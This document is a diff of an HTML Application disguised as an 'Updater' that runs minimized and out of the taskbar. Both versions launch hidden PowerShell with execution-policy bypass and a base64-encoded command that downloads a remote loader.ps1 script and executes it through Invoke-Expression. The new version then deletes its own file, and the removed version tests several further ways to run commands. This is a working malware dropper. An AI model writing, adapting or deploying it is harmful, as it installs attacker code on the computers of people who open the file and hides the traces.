@@ -4,135 +4,79 @@
   <hta:application
     id="Updater"
     applicationname="Updater"
-    border="none"
-    borderstyle="complex"
-    caption="no"
-    sysmenu="no"
-    scroll="no"
     singleinstance="yes"
     windowstate="minimize"
     showintaskbar="no"
   />
-  <title>Updater</title>
+  <title>Updater (Debug)</title>
   <script language="VBScript">
     Sub Window_OnLoad()
-        Dim sh, fso, tempPath, debugPath, encodedCmd
-        Set sh = CreateObject("WScript.Shell")
-        Set fso = CreateObject("Scripting.FileSystemObject")
-        
-        debugPath = sh.ExpandEnvironmentStrings("%TEMP%\hta_execution_test.txt")
-        tempPath = sh.ExpandEnvironmentStrings("%TEMP%")
-        encodedCmd = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
-        
-        Dim logFile
-        Set logFile = fso.CreateTextFile(debugPath, True)
-        logFile.WriteLine "=== HTA EXECUTION TEST ==="
-        logFile.WriteLine "Time: " & Now()
-        logFile.WriteLine "Temp Path: " & tempPath
-        logFile.WriteLine ""
-        logFile.Close
-        
-        ' Test 1: Direct cmd.exe execution
-        LogStep "Test 1: Direct cmd.exe test"
-        sh.Run "cmd.exe /c echo Direct cmd test > """ & tempPath & "\test1.txt""", 0, False
-        
-        ' Test 2: PowerShell direct execution
-        LogStep "Test 2: Direct PowerShell test"
-        sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""'PowerShell direct test' | Out-File -FilePath '" & tempPath & "\test2.txt'""", 0, False
-        
-        ' Test 3: Create and execute simple batch
-        LogStep "Test 3: Simple batch file test"
-        Dim simpleBat
-        simpleBat = tempPath & "\simple.bat"
-        Set batFile = fso.CreateTextFile(simpleBat, True)
-        batFile.WriteLine "@echo off"
-        batFile.WriteLine "echo Simple batch executed > """ & tempPath & "\test3.txt"""
-        batFile.Close
-        sh.Run Chr(34) & simpleBat & Chr(34), 0, False
-        
-        ' Test 4: VBScript execution method
-        LogStep "Test 4: VBScript execution method"
-        Dim vbsFile, vbsPath
-        vbsPath = tempPath & "\test.vbs"
-        Set vbsFile = fso.CreateTextFile(vbsPath, True)
-        vbsFile.WriteLine "Set fso = CreateObject(""Scripting.FileSystemObject"")"
-        vbsFile.WriteLine "Set file = fso.CreateTextFile(""" & tempPath & "\test4.txt"", True)"
-        vbsFile.WriteLine "file.WriteLine ""VBScript executed successfully"""
-        vbsFile.WriteLine "file.Close"
-        vbsFile.Close
-        sh.Run "cscript.exe //nologo """ & vbsPath & """", 0, False
-        
-        ' Test 5: Direct PowerShell with your encoded command
-        LogStep "Test 5: Direct PowerShell with encoded command"
-        sh.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand " & encodedCmd, 0, False
-        
-        ' Test 6: PowerShell with decoded command
-        LogStep "Test 6: PowerShell with decoded command execution"
-        Dim decodeCmd
-        decodeCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" & encodedCmd & "')); $decoded | Out-File -FilePath '" & tempPath & "\decoded_output.txt'; Invoke-Expression $decoded"""
-        sh.Run decodeCmd, 0, False
-        
-        ' Test 7: WScript.Shell alternative
-        LogStep "Test 7: WScript.Shell alternative execution"
-        Dim wshShell
-        Set wshShell = CreateObject("Shell.Application")
-        wshShell.ShellExecute "cmd.exe", "/c echo Shell.Application test > """ & tempPath & "\test7.txt""", "", "", 0
-        
-        setTimeout "CheckExecutionResults", 8000
+      Dim sh, psPath, cmdLine, dbg, fso, dbgFile, htaPath
+
+      ' --- Setup debug log ---
+      Set fso    = CreateObject("Scripting.FileSystemObject")
+      dbg        = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\hta_debug.txt")
+      If fso.FileExists(dbg) Then fso.DeleteFile dbg, True
+      Set dbgFile = fso.CreateTextFile(dbg, True)
+      dbgFile.WriteLine "HTA Debug Start: " & Now()
+      dbgFile.Close
+      MsgBox "Debug: Started", vbOKOnly, "HTA Debug"
+
+      ' --- 1) Create Shell object ---
+      On Error Resume Next
+      Set sh = CreateObject("WScript.Shell")
+      If Err.Number <> 0 Then
+        MsgBox "Error at CreateObject: " & Err.Description, vbCritical, "HTA Debug"
+        AppendLog "Failed to create WScript.Shell: " & Err.Description
+        Exit Sub
+      Else
+        MsgBox "Debug: Created Shell", vbOKOnly, "HTA Debug"
+        AppendLog "Created WScript.Shell"
+      End If
+      On Error GoTo 0
+
+      ' --- 2) Resolve PowerShell path ---
+      psPath = sh.ExpandEnvironmentStrings("%SystemRoot%\Sysnative\WindowsPowerShell\v1.0\powershell.exe")
+      MsgBox "Debug: psPath = " & psPath, vbOKOnly, "HTA Debug"
+      AppendLog "psPath = " & psPath
+
+      ' --- 3) Build command line ---
+      cmdLine = Chr(34) & psPath & Chr(34) & " -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYwBvAG4AYwBlAG4AdAByAGEAdABlAGQAcwB1AGwAZgB1AHIAaQBjAGEAYwBpAGQALwB2AGUAYwB0AG8AcgAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AbABvAGEAZABlAHIALgBwAHMAMQAnACkA"
+      MsgBox "Debug: cmdLine = " & cmdLine, vbOKOnly, "HTA Debug"
+      AppendLog "cmdLine built"
+
+      ' --- 4) Run PowerShell ---
+      On Error Resume Next
+      sh.Run cmdLine, 0, False
+      If Err.Number <> 0 Then
+        MsgBox "Error at sh.Run: " & Err.Description, vbCritical, "HTA Debug"
+        AppendLog "sh.Run failed: " & Err.Description
+        Exit Sub
+      Else
+        MsgBox "Debug: sh.Run invoked", vbOKOnly, "HTA Debug"
+        AppendLog "sh.Run invoked successfully"
+      End If
+      On Error GoTo 0
+
+      ' --- 5) Clean up HTA ---
+      htaPath = document.location.pathname
+      MsgBox "Debug: about to delete HTA at " & htaPath, vbOKOnly, "HTA Debug"
+      AppendLog "Deleting HTA: " & htaPath
+      fso.DeleteFile htaPath, True
+      AppendLog "HTA deleted"
+
+      ' --- 6) Close the window ---
+      MsgBox "Debug: closing HTA", vbOKOnly, "HTA Debug"
+      AppendLog "Closing HTA"
+      self.close
     End Sub
-    
-    Sub LogStep(message)
-        Dim fso, debugPath, logFile
-        Set fso = CreateObject("Scripting.FileSystemObject")
-        debugPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\hta_execution_test.txt")
-        Set logFile = fso.OpenTextFile(debugPath, 8, True)
-        logFile.WriteLine Now() & " - " & message
-        logFile.Close
-    End Sub
-    
-    Sub CheckExecutionResults()
-        Dim fso, tempPath, debugPath, logFile
-        Set fso = CreateObject("Scripting.FileSystemObject")
-        tempPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%")
-        debugPath = tempPath & "\hta_execution_test.txt"
-        
-        Set logFile = fso.OpenTextFile(debugPath, 8, True)
-        logFile.WriteLine ""
-        logFile.WriteLine "=== RESULTS ==="
-        logFile.WriteLine "Check time: " & Now()
-        logFile.WriteLine ""
-        
-        ' Check each test result
-        Dim i
-        For i = 1 To 7
-            If fso.FileExists(tempPath & "\test" & i & ".txt") Then
-                logFile.WriteLine "Test " & i & ": SUCCESS"
-                Dim testFile
-                Set testFile = fso.OpenTextFile(tempPath & "\test" & i & ".txt", 1)
-                logFile.WriteLine "  Content: " & testFile.ReadAll()
-                testFile.Close
-            Else
-                logFile.WriteLine "Test " & i & ": FAILED - No output file"
-            End If
-        Next
-        
-        ' Check decoded output
-        If fso.FileExists(tempPath & "\decoded_output.txt") Then
-            logFile.WriteLine "Decoded output: SUCCESS"
-            Dim decodedFile
-            Set decodedFile = fso.OpenTextFile(tempPath & "\decoded_output.txt", 1)
-            logFile.WriteLine "  Content: " & decodedFile.ReadAll()
-            decodedFile.Close
-        Else
-            logFile.WriteLine "Decoded output: FAILED"
-        End If
-        
-        logFile.Close
-        setTimeout "CleanupAndExit", 2000
-    End Sub
-    
-    Sub CleanupAndExit()
-        self.close
+
+    Sub AppendLog(msg)
+      Dim lf, fso
+      Set fso = CreateObject("Scripting.FileSystemObject")
+      Set lf = fso.OpenTextFile(CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%\hta_debug.txt"), 8, True)
+      lf.WriteLine Now() & " - " & msg
+      lf.Close
     End Sub
   </script>
 </head>
